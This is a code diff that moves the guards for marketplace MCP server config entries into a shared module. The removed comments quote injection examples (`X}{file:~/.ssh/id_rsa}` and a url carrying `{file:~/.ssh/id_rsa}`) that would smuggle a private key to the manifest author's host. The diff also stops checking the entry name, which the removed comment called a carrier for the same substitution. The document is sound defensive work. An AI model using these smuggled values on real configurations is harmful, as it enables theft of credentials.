@@ -7,6 +7,7 @@ import {
   type MarketplaceListDeps,
 } from "../marketplace/shared"
 import type { PluginMarketplaceStatus } from "../plugin/discover"
+import { envReferences, headerReferences, rejectSubstitution } from "../marketplace/guard"
 
 export type McpListEntry = {
   name: string
@@ -69,57 +70,11 @@ export async function searchMcpServers(
   return { marketplaceCount, marketplaces, servers: matches }
 }
 
-// The manifest carries variable NAMES; config wants name -> value. We write `{env:NAME}`, the
-// substitution syntax config already supports (see docs/config.mdx). The generated
-// opencode.json therefore contains no secret and is safe to commit to a repository — which it
-// would not be had we prompted for key values and written them literally.
-//
-// `environment`/`headers` are a bare `Schema.Array(String)` with no identifier constraint, so
-// nothing stops a third-party marketplace (unlike our own published manifest, which the web repo
-// guards) from declaring a "name" like "API_TOKEN=secret". Left unchecked that would flow
-// straight through as `{env:API_TOKEN=secret}` -- a literal value written into the user's config,
-// exactly what this scheme exists to avoid. We throw rather than silently drop it: every other
-// refusal on the marketplace add path (ambiguous name, existing entry) is a thrown Error the
-// caller turns into a failed `mcp add` with a message, and a malformed declared name deserves the
-// same rather than a server that's silently missing a variable it needs.
-//
-// `=` is not the only hazard. ConfigVariable.substitute expands {env:...} and then scans the
-// result for {file:...}, so a name like `X}{file:~/.ssh/id_rsa}` becomes
-// `{env:X}{file:~/.ssh/id_rsa}` and reads that file into a header sent to the manifest author's
-// url. Names are therefore held to an allowlist (letters, digits, `_`, `-`) rather than a
-// denylist of characters we thought of.
-const VARIABLE_NAME = /^[A-Za-z_][A-Za-z0-9_-]*$/
-// Every other manifest string written into config verbatim (name, url, command, cwd) is a carrier
-// for the same substitution -- the name too, because substitute() rewrites keys as well as values.
-// A remote entry otherwise runs nothing locally, so a url like `https://x/?k={file:~/.ssh/id_rsa}`
-// pulling file contents would be a strict escalation over what the user confirmed.
-const SUBSTITUTION = /\{(env|file):/
-
-function envReferences(entryName: string, names: readonly string[] | undefined) {
-  if (!names?.length) return undefined
-  for (const name of names) {
-    if (!VARIABLE_NAME.test(name)) {
-      throw new Error(`MCP server "${entryName}" declares an invalid environment/header name: "${name}"`)
-    }
-  }
-  return Object.fromEntries(names.map((name) => [name, `{env:${name}}`]))
-}
-
-function rejectSubstitution(entryName: string, values: readonly (string | undefined)[]) {
-  for (const value of values) {
-    if (value && SUBSTITUTION.test(value)) {
-      throw new Error(`MCP server "${entryName}" contains a config substitution token: "${value}"`)
-    }
-  }
-}
-
+// Guards live in ../marketplace/guard.ts, shared with every other marketplace content kind.
 export function mcpConfigFromEntry(entry: Marketplace.McpEntry): ConfigMCPV1.Info {
-  rejectSubstitution(
-    entry.name,
-    entry.type === "remote" ? [entry.name, entry.url] : [entry.name, ...entry.command, entry.cwd],
-  )
+  rejectSubstitution(entry.name, entry.type === "remote" ? [entry.url] : [...entry.command, entry.cwd])
   if (entry.type === "remote") {
-    const headers = envReferences(entry.name, entry.headers)
+    const headers = headerReferences(entry.name, entry.headers)
     return {
       type: "remote",
       url: entry.url,
